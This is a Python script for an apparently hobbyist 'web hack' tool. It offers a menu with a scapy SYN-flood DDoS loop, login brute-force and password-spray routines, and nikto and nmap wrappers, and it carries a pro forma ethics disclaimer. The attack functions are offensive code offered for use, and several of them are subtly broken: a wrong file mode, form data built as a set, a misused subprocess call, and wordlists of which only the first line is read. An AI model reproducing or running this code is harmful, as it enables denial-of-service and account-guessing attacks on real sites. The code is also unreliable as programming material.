import subprocess
import os
import requests
from scapy.all import *
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
def Text():
    print(r"""
    .--.      .--.      .--.      .--.      .--. 
   /    \    /    \    /    \    /    \    /    \
  | W  E |  | B  : )|  | H  A |  | C  K |  | !!! |
   \____/    \____/    \____/    \____/    \____/
      \        /        \        /        /
       \______/          \______/        /
       /      \          /      \       /
      /        \        /        \     /
     |  WEB    |______ |  HACK    |___/  
      \  H4X  /        \  1337   /
        \____/          \______/ 
          writed by serpten
          """)
def disclaimer():
    print("""
    ⚠️ DISCLAIMER ⚠️
    This tool is intended for EDUCATIONAL and ETHICAL USE ONLY.
    It must be used in controlled environments or with explicit permission.
    Unauthorized use against real systems is ILLEGAL and UNETHICAL.
    Purpose: To learn web security concepts and practice defensive techniques.
    """)
def InputText():
    print(r""" 
  [1] Web Dig
  [2] Web Scan (only nikto)
  [3] Who is(using python selenium)
  [4] Nmap scan
  [5] DDOS
  [6] BruteForce
  [7] Password Spray
  [9] dowland resources
""")


def web_dig(url):
    try:
        responce=requests.get(url)
        print(responce.text)
        file =int(input("""You want write to file(y/n):"""))
        if file.lower()=="y":
            with open("Web_dig.txt") as f:
                f.write(responce.text)
                print("Writed file")
    except Exception as e:
        print("Eror ",e)
def WhoIs(url):
    whoisurl="https://who.is/"

    driver=webdriver.Chrome()

    driver.get(whoisurl)
    searchInput=driver.find_element(By.XPATH,"//*[@id='search']")
    searchInput.send_keys(url)
    searchInput.send_keys(Keys.RETURN)

    i=input("İf you close the site input enter ")
def ddosAttack(webip,port):
    packet = IP(dst=webip)/TCP(dport=port,flags="S")
    while True:
       send(packet)
def niktoScan(url):
	subprocess.run(["nikto ","-h ",url])
def nmapscan(url):
    subprocess(["nmap"," ",url])
def bruteforce(url):
    try:
        username=input("give me username : ")
        passwordpath=input("give me worldlist path(for pass): ")
        with open (passwordpath,"r") as f:
            p=f.readline()
            data={"username:",username,"password:",p}
            responce=requests.post(url,data=data)
            print(responce.text)
    except Exception:
        print("Wrong Pass")
def PasswordSpary(url):
    try:
        usernamepath=input("give me worldlist path(for user) : ")
        password=input("give me pass: ")
        with open ( usernamepath,"r") as f:
            p=f.readline()
            data={"username:",p,"password:",password}
            responce=requests.post(url,data=data)
            print(responce.text)
    except Exception:
        print("Wrong Pass")
def main():
    Text()
    disclaimer()
    InputText()
    i =int(input("Enter The number : "))
    url=input("Enter url : ")
    if i == 1:
        web_dig(url)
    elif i == 2:
        niktoScan(url)
    elif i == 3:
        WhoIs(url)
    elif i == 4:
        nmapscan(url)
    elif i == 5:
        ip=input("give me ip")
        port=input("give me port")
        ddosAttack(ip,port)
    elif i == 6:
        bruteforce(url)
    elif i == 7:
        PasswordSpary(url)
    elif i == 9:
        os.system("pip install selenium") 
        os.system("pip install requests")
        os.system("pip install python-nmap")
        os.system("pip install scapy")
if __name__ == "__main__":
    main()